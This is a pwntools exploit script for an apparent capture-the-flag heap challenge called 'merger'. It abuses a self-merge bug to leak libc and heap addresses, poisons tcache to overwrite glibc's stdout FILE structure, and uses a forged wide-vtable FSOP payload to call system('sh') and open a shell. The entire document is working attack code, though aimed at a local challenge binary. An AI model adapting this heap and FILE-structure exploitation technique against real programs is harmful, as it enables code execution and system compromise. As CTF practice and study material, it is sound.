#!/usr/bin/env python3

from pwn import *

elf = ELF("./merger_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('gnome-terminal', '-e')

def conn():
    global r
    if args.REMOTE:
        r = remote("localhost", "1337")
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b merge
                                b *merge+227
                                b *merge+304
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(size: int, idx: int, data: bytes):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'index: ', str(idx).encode())
    r.sendlineafter(b'size: ', str(size).encode())
    r.sendafter(b'data: ', data)

def free(idx: int):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'index: ', str(idx).encode())

def read(idx: int) -> bytes:
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'index: ', str(idx).encode())
    return r.recvline().strip()

def merge(dest: int, source: int) -> bytes:
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'dst: ', str(dest).encode())
    r.sendlineafter(b'src: ', str(source).encode())
    r.recvuntil(b'Merged: ')
    return r.recvline().strip()

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=-0x70):
    # https://jia.je/ctf-writeups/2025-09-07-blackhat-mea-ctf-quals-2025/file101.html   ty <3
    return flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.bss(0x2000),
        # fake_file->file._wide_data
        0xA0: libc.symbols["_IO_2_1_stdout_"],
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
        # fake_file->file._wide_data->_wide_vtable
        0xE0: libc.symbols["_IO_2_1_stdout_"],
    })

def main():
    r = conn()

    for i in range(7):
        alloc(0x80, i+10, b'\n')
    for i in range(9):
        alloc(0xf0, i, b'\n')
    for i in range(8):
        free(i)

    alloc(0x80, 7, b'a'*0x80)
    
    for i in range(7):
        alloc(0xf0, i, b'\n')
        free(i+10)

    # chunk 7 gets put both to the unsorted bin by realloc and then to the tcache by free. This works because tcache checks are done before unsorted bin checks by free, so if they already pass, the chunk gets put to the tcache too.   
    libc.address = u64(merge(7,7)[-6:].ljust(8, b'\x00')) - 0x203b20
    log.success(f"Libc base: {hex(libc.address)}")

    # after these 2 lines point 0 and 1 will point to the same chunk
    alloc(0xf0, 0, p64(libc.address+0x203b20)*2 + b'\n')
    alloc(0xf0, 1, b'\n')
    
    free(1)
    heap_base = u64(read(0).ljust(8, b'\x00')) << 12
    log.success(f"Heap base: {hex(heap_base)}")
    
    alloc(0x10, 2, b'\n')

    # this breaks the 0x100 chunk into two: a 0x20 and a 0xe0 chunk.
    merge(0,2)
    
    # increase the size of the chunk I control with some feng shui to fill stdout completely during fsop
    payload = flat([
        0,
        0,
        0x20,
        0x111,
        ((heap_base + 0xdb0) >> 12),
        0
    ]) + b"\n"
    
    alloc(0xf0, 2, payload)
    free(3)
    free(8)
    
    alloc(0xd0, 5, b'\n')
    free(5)
        
    payload = b'\x00'*0xd0 + flat([
            0x100,
            0x101,
            ((heap_base + 0xea0) >> 12) ^ libc.sym._IO_2_1_stdout_
        ]) + b"\n"
        
    alloc(0xfe, 5, payload)
    alloc(0xf0, 2, b'\n')
    
    alloc(0xe0, 0, b'a'*0xe0)
    payload = fsrop() + b"\n"
    alloc(0xf0, 4, payload)

    r.interactive()


if __name__ == "__main__":
    main()
